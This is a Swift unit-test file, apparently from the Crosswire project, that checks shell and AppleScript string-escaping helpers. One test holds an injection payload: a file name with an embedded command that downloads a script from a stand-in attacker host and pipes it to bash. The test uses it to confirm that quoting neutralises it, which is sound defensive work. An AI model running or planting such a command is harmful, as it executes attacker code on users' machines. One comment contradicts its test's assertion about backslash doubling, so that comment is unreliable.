//
//  ShellQuotingTests.swift
//  CrosswireKitTests
//
//  This file is part of Crosswire.
//
//  Crosswire is free software: you can redistribute it and/or modify it under the terms
//  of the GNU General Public License as published by the Free Software Foundation,
//  either version 3 of the License, or (at your option) any later version.
//
//  Crosswire is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
//  without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
//  See the GNU General Public License for more details.
//
//  You should have received a copy of the GNU General Public License along with Crosswire.
//  If not, see https://www.gnu.org/licenses/.
//

import XCTest
@testable import CrosswireKit

/// `shellQuoted` wraps a string as a single, safe POSIX shell argument using the
/// standard single-quote-escaping technique (close quote, escaped literal quote,
/// reopen quote). Single quotes suppress all shell interpretation except this one
/// case, which is what makes it safe for arbitrary attacker-controlled content --
/// unlike backslash-per-metacharacter escaping, its correctness doesn't depend on
/// what quoting context it ends up embedded in.
final class ShellQuotedTests: XCTestCase {

    func testPlainStringIsWrappedInSingleQuotes() {
        XCTAssertEqual("MyGame".shellQuoted, "'MyGame'")
    }

    func testEmptyStringIsWrappedInEmptyQuotes() {
        XCTAssertEqual("".shellQuoted, "''")
    }

    /// The one character single quotes can't represent directly.
    func testEmbeddedSingleQuoteIsEscaped() {
        XCTAssertEqual("O'Brien".shellQuoted, "'O'\\''Brien'")
    }

    /// The actual attack payload from the audit finding: command substitution and
    /// a pipe must survive as inert literal characters, not be interpreted, once
    /// wrapped -- single quotes need no escaping for `$`, `(`, `)`, or `|`.
    func testShellMetacharactersAreNeutralized() {
        let payload = "Setup $(curl -s https://evil.example/p.sh|bash).exe"
        XCTAssertEqual(payload.shellQuoted, "'Setup $(curl -s https://evil.example/p.sh|bash).exe'")
    }

    /// A bare double quote is not special once inside single quotes, so it must
    /// pass through unescaped and unmodified.
    func testDoubleQuoteInsideIsUnescaped() {
        XCTAssertEqual("say \"hi\"".shellQuoted, "'say \"hi\"'")
    }
}

/// `appleScriptQuoted` escapes a string for embedding inside a double-quoted
/// AppleScript string literal (e.g. the argument to `do script "..."`). AppleScript
/// string literals only recognize two escapes: `\\` for a literal backslash and
/// `\"` for a literal double quote.
final class AppleScriptQuotedTests: XCTestCase {

    func testPlainStringIsUnchanged() {
        XCTAssertEqual("eval something".appleScriptQuoted, "eval something")
    }

    func testDoubleQuoteIsEscaped() {
        XCTAssertEqual("say \"hi\"".appleScriptQuoted, "say \\\"hi\\\"")
    }

    func testBackslashIsEscaped() {
        XCTAssertEqual("a\\b".appleScriptQuoted, "a\\\\b")
    }

    /// Backslashes must be escaped before quotes are, otherwise the backslash
    /// introduced by quote-escaping would itself get re-escaped.
    func testBackslashThenQuoteOrderingIsCorrect() {
        // Input already contains an escaped-looking quote from a prior shellQuoted
        // pass, e.g. `'O'\''Brien'` -- appleScriptQuoted must not double the
        // backslash that shellQuoted put there.
        let input = "'O'\\''Brien'"
        XCTAssertEqual(input.appleScriptQuoted, "'O'\\\\''Brien'")
    }
}
